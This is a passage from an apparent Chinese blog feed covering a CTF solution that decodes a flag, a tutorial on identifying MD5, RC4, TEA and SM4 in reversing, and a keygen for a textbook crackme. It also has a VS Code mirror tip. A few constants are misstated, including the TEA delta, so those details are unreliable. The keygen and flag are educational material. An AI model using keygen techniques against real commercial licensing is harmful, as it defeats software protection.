class="number">0x6e</span></span><br><span class="line">local_138[<span class="number">0x11</span>] = <span class="number">0x4a</span></span><br><span class="line">local_138[<span class="number">0x12</span>] = <span class="number">0x76</span></span><br><span class="line">local_138[<span class="number">0x13</span>] = <span class="number">0x47</span></span><br><span class="line">local_138[<span class="number">0x14</span>] = <span class="number">0x78</span></span><br><span class="line">local_138[<span class="number">0x15</span>] = <span class="number">0x35</span></span><br><span class="line">local_138[<span class="number">0x16</span>] = <span class="number">0x6e</span></span><br><span class="line">local_138[<span class="number">0x17</span>] = <span class="number">0x50</span></span><br><span class="line">local_138[<span class="number">0x18</span>] = <span class="number">0x7a</span></span><br><span class="line">local_138[<span class="number">0x19</span>] = <span class="number">0x35</span></span><br><span class="line">local_138[<span class="number">0x1a</span>] = <span class="number">0x33</span></span><br><span class="line">local_138[<span class="number">0x1b</span>] = <span class="number">0x4e</span></span><br><span class="line">local_138[<span class="number">0x1c</span>] = <span class="number">0x7a</span></span><br><span class="line">local_138[<span class="number">0x1d</span>] = <span class="number">0x38</span></span><br><span class="line">local_138[<span class="number">0x1e</span>] = <span class="number">0x75</span></span><br><span class="line">local_138[<span class="number">0x1f</span>] = <span class="number">0x61</span></span><br><span class="line">local_138[<span class="number">0x20</span>] = <span class="number">0x78</span></span><br><span class="line">local_138[<span class="number">0x21</span>] = <span class="number">0x73</span></span><br><span class="line">local_138[<span class="number">0x22</span>] = <span class="number">0x66</span></span><br><span class="line">local_138[<span class="number">0x23</span>] = <span class="number">0x47</span></span><br><span class="line">local_138[<span class="number">0x24</span>] = <span class="number">0x78</span></span><br><span class="line">local_138[<span class="number">0x25</span>] = <span class="number">0x73</span></span><br><span class="line">local_138[<span class="number">0x26</span>] = <span class="number">0x65</span></span><br><span class="line">local_138[<span class="number">0x27</span>] = <span class="number">0x61</span></span><br><span class="line">local_138[<span class="number">0x28</span>] = <span class="number">0x6e</span></span><br><span class="line">local_138[<span class="number">0x29</span>] = <span class="number">0x4a</span></span><br><span class="line">local_138[<span class="number">0x2a</span>] = <span class="number">0x6e</span></span><br><span class="line">local_138[<span class="number">0x2b</span>] = <span class="number">0x48</span></span><br><span class="line">local_138[<span class="number">0x2c</span>] = <span class="number">0x79</span></span><br><span class="line">local_138[<span class="number">0x2d</span>] = <span class="number">0x38</span></span><br><span class="line">local_138[<span class="number">0x2e</span>] = <span class="number">0x33</span></span><br><span class="line">local_138[<span class="number">0x2f</span>] = <span class="number">0x49</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 将 local_138 转换为字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> local_138])</span><br><span class="line"><span class="built_in">print</span>(encoded_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = encoded_str  <span class="comment">## 欲解密的字符串</span></span><br><span class="line">outtab = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>  <span class="comment">## 原生字母表</span></span><br><span class="line">intab = <span class="string">&quot;/+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA&quot;</span>  <span class="comment">## 换表之后的字母表</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="built_in">str</span>.translate(<span class="built_in">str</span>.maketrans(intab, outtab))))</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u76svKu5hJvLzpvHnJvGx5nPz53Nz8uaxsfGxseanJnHy83ImoL=</span><br><span class="line"><span class="string">b&#x27;DASCTF&#123;d41d8cd98f00b204e98998ecf8427e&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向中常见的Hash算法和对称加密算法</title>
      <link href="/2024/10/30/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86/"/>
      <url>/2024/10/30/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-单向散列算法"><a href="#1-单向散列算法" class="headerlink" title="1 单向散列算法"></a>1 单向散列算法</h2><p>单向散列函数算法也称Hash（哈希）算法，是一种将任意长度的消息压缩到某一固定长度（消息摘要）的函数（该过程不可逆）。Hash函数可用于数字签名、消息的完整性检测、消息起源的认证检测等。常见的<br>散列算法有MD5、SHA、RIPE-MD、HAVAL、N-Hash等。</p><p>在软件的加密保护中，Hash函数是经常用到的加密算法。但是，由于Hash函数为不可逆算法，所以<br>软件只能使用Hash函数作为一个加密的中间步骤。例如，对用户名做一个Hash变换，将这个结果再进行<br>一个可逆的加密变换（如对称密码），变换结果为注册码。从解密角度来说，一般不必了解Hash函数的<br>具体内容（变种算法除外），只要能识别出是何种Hash函数就可以了，然后直接套用相关算法源码实现。</p><h3 id="1-1-MD5算法"><a href="#1-1-MD5算法" class="headerlink" title="1.1 MD5算法"></a>1.1 MD5算法</h3><p>MD5算法消息摘要算法对任意长度的消息进行运算，产生一个128位的消息摘要。近年来，随着穷举攻击和密码分析的发展，应用最为广泛的MD5算法已经不再那么流行了。</p><h4 id="1-1-1-算法原理"><a href="#1-1-1-算法原理" class="headerlink" title="1.1.1 算法原理"></a>1.1.1 算法原理</h4><ol><li><p>数据填充</p><p>填充消息使其长度与448模512同余（即长度&#x3D;448 mod512）。也就是说，填充后的消息长度比512<br>的倍数仅小64位的数。即使消息长度本身已经满足上述长度要求，仍然需要填充。 填充方法是附一个1在消息后面，然后用0来进行填充，直到消息的长度与448模512同余。至少填<br>充1位，至多填充512位。</p></li><li><p>添加长度</p><p>在第一步的结果之后附上64位的消息长度。如果填充前消息的长度大于24，贝 则只使用其低64位。<br>这时，在添加完填充位和消息长度之后，最终消息的长度正好就是512的整数倍了。 令M[0…N-1]表示最终的消息，其中N是16的倍数。</p></li><li><p>初始化变量</p><p>用到4个变量 量（A，B,C,D）来计算消息摘要。这里A,B,C,D分别都是一个32位的寄存器。这些寄 存器以下面的十六进制数值来初始化：A&#x3D;01234567h，<br>B&#x3D;89abcdefh, C&#x3D;fedcba98h, D&#x3D;76543210h。 并且在内存中是以低字节在前的形式来存储的，民 即如下格式：</p><p><strong>01 23 45 67 89 AB CD EF FE DC BA 86 76 54 32 10</strong></p></li><li><p>数据处理<br><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image.png" alt="image.png"></p></li><li><p>输出</p><p>当所有的512位分组都运算完毕后，ABCD的级联将被输出为MD5散列的结果。以上是MD5算法的 简单描述，更 更为详细的实现程序，<br>请参考光盘中的源代码。</p></li></ol><h4 id="1-1-2-示例"><a href="#1-1-2-示例" class="headerlink" title="1.1.2 示例"></a>1.1.2 示例</h4><p>使用加密与解密中的随书文件<strong>MD5KeyGenMe.exe</strong>来分析<br><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%201.png" alt="image 1.png"></p><p>打开程序发现需要输入两个text来进行验证，通过导入表中的**<code>GetDlgItemTextA</code>**函数定位到关键代码</p><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%202.png" alt="image 2.png"><br><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%203.png" alt="image 3.png"><br><code>sub_4010A0</code>函数反编译后的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_4010A0(HWND hDlg)</span><br><span class="line">&#123;</span><br><span class="line">  UINT DlgItemTextA; // edi</span><br><span class="line">  int v2; // eax</span><br><span class="line">  int i; // eax</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  CHAR String1[17]; // [esp+10h] [ebp-3C8h] BYREF</span><br><span class="line">  __int16 v7; // [esp+21h] [ebp-3B7h]</span><br><span class="line">  char v8; // [esp+23h] [ebp-3B5h]</span><br><span class="line">  CHAR v9[24]; // [esp+24h] [ebp-3B4h] BYREF</span><br><span class="line">  char v10[36]; // [esp+3Ch] [ebp-39Ch] BYREF</span><br><span class="line">  CHAR v11[197]; // [esp+60h] [ebp-378h] BYREF</span><br><span class="line">  __int16 v12; // [esp+125h] [ebp-2B3h]</span><br><span class="line">  char v13; // [esp+127h] [ebp-2B1h]</span><br><span class="line">  _DWORD v14[22]; // [esp+128h] [ebp-2B0h] BYREF</span><br><span class="line">  _BYTE v15[197]; // [esp+180h] [ebp-258h] BYREF</span><br><span class="line">  __int16 v16; // [esp+245h] [ebp-193h]</span><br><span class="line">  char v17; // [esp+247h] [ebp-191h]</span><br><span class="line">  CHAR String[197]; // [esp+248h] [ebp-190h] BYREF</span><br><span class="line">  __int16 v19; // [esp+30Dh] [ebp-CBh]</span><br><span class="line">  char v20; // [esp+30Fh] [ebp-C9h]</span><br><span class="line">  CHAR String2[197]; // [esp+310h] [ebp-C8h] BYREF</span><br><span class="line">  __int16 v22; // [esp+3D5h] [ebp-3h]</span><br><span class="line">  char v23; // [esp+3D7h] [ebp-1h]</span><br><span class="line"></span><br><span class="line">  memset(String, 0, sizeof(String));</span><br><span class="line">  memset(v15, 0, sizeof(v15));</span><br><span class="line">  v19 = 0;</span><br><span class="line">  v20 = 0;</span><br><span class="line">  memset(String2, 0, sizeof(String2));</span><br><span class="line">  v16 = 0;</span><br><span class="line">  v17 = 0;</span><br><span class="line">  memset(v11, 0, sizeof(v11));</span><br><span class="line">  v22 = 0;</span><br><span class="line">  v23 = 0;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  v13 = 0;</span><br><span class="line">  qmemcpy(v9, aWwwPediyCom, 0x15u);</span><br><span class="line">  strcpy(v10, &quot;23456789ABCDEFGHJKLMNPQRSTUVWXYZ&quot;);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  memset(String1, 0, sizeof(String1));</span><br><span class="line">  v8 = 0;</span><br><span class="line">  DlgItemTextA = GetDlgItemTextA(hDlg, 1000, String, 201);</span><br><span class="line">  if ( !DlgItemTextA )</span><br><span class="line">    goto LABEL_10;</span><br><span class="line">  if ( GetDlgItemTextA(hDlg, 1001, v11, 201) != 19 )</span><br><span class="line">    goto LABEL_10;</span><br><span class="line">  if ( v11[4] != 45 )</span><br><span class="line">    goto LABEL_10;</span><br><span class="line">  if ( v11[9] != 45 )</span><br><span class="line">    goto LABEL_10;</span><br><span class="line">  if ( v11[14] != 45 )</span><br><span class="line">    goto LABEL_10;</span><br><span class="line">  *(_DWORD *)&amp;String1[4] = *(_DWORD *)&amp;v11[5];</span><br><span class="line">  *(_DWORD *)String1 = *(_DWORD *)v11;</span><br><span class="line">  *(_DWORD *)&amp;String1[8] = *(_DWORD *)&amp;v11[10];</span><br><span class="line">  *(_DWORD *)&amp;String1[12] = *(_DWORD *)&amp;v11[15];</span><br><span class="line">  sub_4012B0(v14);</span><br><span class="line">  sub_4012E0(v14, String, DlgItemTextA);</span><br><span class="line">  v2 = lstrlenA(v9);</span><br><span class="line">  sub_4012E0(v14, v9, v2);</span><br><span class="line">  sub_401390(v15, v14);</span><br><span class="line">  for ( i = 0; i &lt; 16; String2[i - 1] = v10[v4] )</span><br><span class="line">    v4 = v15[i++] &amp; 0x1F;</span><br><span class="line">  if ( !lstrcmpA(String1, String2) )</span><br><span class="line">  &#123;</span><br><span class="line">    SetDlgItemTextA(hDlg, 1001, ::String);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">    SetDlgItemTextA(hDlg, 1001, aWrongSerial);</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跟进函数<code>sub_4012B0</code>发现MD5特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__cdecl sub_4012B0(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  a1[5] = 0;</span><br><span class="line">  a1[4] = 0;</span><br><span class="line">  *a1 = 0x67452301;</span><br><span class="line">  a1[1] = 0xEFCDAB89;</span><br><span class="line">  a1[2] = 0x98BADCFE;</span><br><span class="line">  a1[3] = 0x10325476;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然也可以直接使用插件判断算法</p><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%204.png" alt="image 4.png"><br>分析代码<br><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%205.png" alt="image 5.png"></p><p>把name和pediy.com做一个拼接，然后在做一次变换得倒最终的序列号</p><p>编写注册机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">name = b&#x27;bjw&#x27;</span><br><span class="line"># 坑 这里不能用hex</span><br><span class="line">digest = md5(name + b&#x27;www.pediy.com&#x27;).digest()</span><br><span class="line">print(f&#x27;MD5(&#123;name&#125;)=&#123;digest.hex()&#125;&#x27;)</span><br><span class="line">a2345 = &#x27;23456789ABCDEFGHJKLMNPQRSTUVWXYZ&#x27;</span><br><span class="line">serial_number = &#x27;&#x27;</span><br><span class="line">for b in digest:</span><br><span class="line">    serial_number += a2345[b &amp; 0x1F]</span><br><span class="line">print(f&#x27;Serial Number(&#123;name&#125;)=&#123;serial_number[0:4]&#125;-&#123;serial_number[4:8]&#125;-&#123;serial_number[8:12]&#125;-&#123;serial_number[12:16]&#125;&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-2-其他算法"><a href="#1-2-其他算法" class="headerlink" title="1.2 其他算法"></a>1.2 其他算法</h3><p>SHA算法特征值</p><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%206.png" alt="image 6.png"><br><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%207.png" alt="image 7.png"></p><h2 id="2-对称加密算法"><a href="#2-对称加密算法" class="headerlink" title="2 对称加密算法"></a>2 对称加密算法</h2><p>常见的对称分组加密算法有 DES(Data EncryptionStandard)、IDEA（Intemational 1Data Encryption<br>Algorithm）、AES（AdvancedEncryptionStandard）、BlowFish、Twofish等。本节将以常见的对称加密算法TEA、IDEA、BlowFish、AES及流密码RC4为例，介绍对称算法在软件保护中的应用。感兴趣的读者可<br>以进一步阅读密码学相关书籍，如《对称密码学》（机械工业出版社）来了解更多的关于对称密码的知识。</p><h3 id="2-1-RC4流密码"><a href="#2-1-RC4流密码" class="headerlink" title="2.1 RC4流密码"></a>2.1 RC4流密码</h3><p>RC4生成一种称为密钥流的伪随机流，它同明文通过异或操作相混合以达到加密的目的，解密时，同密文进行异或操作。其密钥流的生成由两部分组成：KSA和PRGA。</p><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%208.png" alt="image 8.png"><br>(1） KSA ( the Key-Scheduling Algorithn )</p><p>RC4 首先使用密钥调度算法（KSA）完成对大小为 256字节的数组S的初始化及替换，在替 换时使用密钥。其密钥的长度一般取 5～16 字节，即<br>40～128 位，也可以更长，通常不超过 256 位。先用0～255初始化数组S，然后使用密钥进行替换，伪代码如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for i=0 to 255 do</span><br><span class="line">  S[i]:=i;</span><br><span class="line">j:=0;</span><br><span class="line"></span><br><span class="line">for i=0 to 255 do</span><br><span class="line">  j:=(j+S[i]+key[i mod keylength]) mod 256; //重复使用密钥</span><br><span class="line">  Swap(s[i],S[j]); //交换s[i]与s[j]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(2） PRGA( the Pseudo-Random Generation Algorithm) 数组S在完成初始化之后，便不再使用输人的密钥。密钥流的生成是从ST0]<br>到ST255]的。对每 个S[]，根据当前S的值，将S[]与S中的另一字节置换。在S[255]完成转换后，操作仍重复执行。 伪代码如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i,j=0;</span><br><span class="line">while(明文未结束)</span><br><span class="line">  i=(i+1）mod 256;</span><br><span class="line">  j=（j+S[i]）mod256;</span><br><span class="line">  Swap(s[i],S[j]);</span><br><span class="line">  t=(S[i]+S[j]）mod256;</span><br><span class="line">  k=S[t];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到的子密码k用于和明文进行XOR运算，得到密文。解密过程也完全相同。由于RC4算法 在加密时采用的是XOR运算，一旦子密钥序列出现了重复，密文就有可能被破解。因此，在使用<br>RC4算法时，必须对加密密钥进行测试，以判断其是否为弱密钥。</p><h3 id="2-2-TEA算法"><a href="#2-2-TEA算法" class="headerlink" title="2.2 TEA算法"></a>2.2 TEA算法</h3><p>TEA是分组密码，分组长度为64位，密钥长度为128位，采用Feistel网络。</p><p>其加密过程也比较简单。</p><p>算法的特征为<code>delta = 0x9E377989</code>，这个常量是由黄金分割点得来的。TEA的变种算法也常用到这个变量，但是加密过程不同。</p><p>在加密轮数方面，作者推荐的加密轮数是64轮，即循环32次，也可以采用其他加密轮数，比如32轮或者128轮，在分析的时候也需要注意。</p><p>如下图：</p><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%209.png" alt="image 9.png"></p><h3 id="2-3-SM4国密算法"><a href="#2-3-SM4国密算法" class="headerlink" title="2.3 SM4国密算法"></a>2.3 SM4国密算法</h3><p>SM4是一个分组算法，分组长度为128比特，密钥成都为128比特其结构是Fesitel网络的一个变体。</p><p>SM4的特征为S-box</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">static const unsigned char SboxTable[16][16] =</span><br><span class="line">&#123;</span><br><span class="line">&#123;0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05&#125;,</span><br><span class="line">&#123;0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99&#125;,</span><br><span class="line">&#123;0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62&#125;,</span><br><span class="line">&#123;0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6&#125;,</span><br><span class="line">&#123;0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8&#125;,</span><br><span class="line">&#123;0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35&#125;,</span><br><span class="line">&#123;0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87&#125;,</span><br><span class="line">&#123;0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e&#125;,</span><br><span class="line">&#123;0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1&#125;,</span><br><span class="line">&#123;0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3&#125;,</span><br><span class="line">&#123;0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f&#125;,</span><br><span class="line">&#123;0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51&#125;,</span><br><span class="line">&#123;0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8&#125;,</span><br><span class="line">&#123;0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0&#125;,</span><br><span class="line">&#123;0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84&#125;,</span><br><span class="line">&#123;0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%2010.png" alt="image 10.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode下载过慢解决</title>
      <link href="/2023/07/19/vscode%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3/"/>
      <url>/2023/07/19/vscode%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<p>从官网下载：</p><p><a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><p>使用自带的Safari浏览器，步骤如下：</p><p>进入vscode官方网站：<a href="https://code.visualstudio.com/Download">https://code.visualstudio.com/Download</a></p><p>点击Mac下载vscode最新版本</p><p>可以看到，下载速度相当的缓慢！！！</p><p>解决步骤</p><p>点击下载项，鼠标右键，拷贝下载项真实地址：</p><p>如：<a href="https://az764295.vo.msecnd.net/stable/74f6148eb9ea00507ec113ec51c489d6ffb4b771/VSCode-darwin.zip">https://az764295.vo.msecnd.net/stable/c3f126316369cd610563c75b1b1725e0679adfb3/VSCode-darwin-universal.zip</a></p><p>修改上面地址的域名：</p><p>把 az764295.vo.msecnd.net 替换成 vscode.cdn.azure.cn，这是国内的镜像，再把下面的地址copy到浏览器，再按回车</p><p><a href="https://vscode.cdn.azure.cn/stable/74f6148eb9ea00507ec113ec51c489d6ffb4b771/VSCode-darwin.zip">https://vscode.cdn.azure.cn/stable/c3f126316369cd610563c75b1b1725e0679adfb3/VSCode-darwin-universal.zip</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue入门</title>
      <link href="/2023/02/19/Vue%E5%85%A5%E9%97%A8/"/>
      <url>/2023/02/19/Vue%E5%85%A5%E9%97%A8/</url>
      
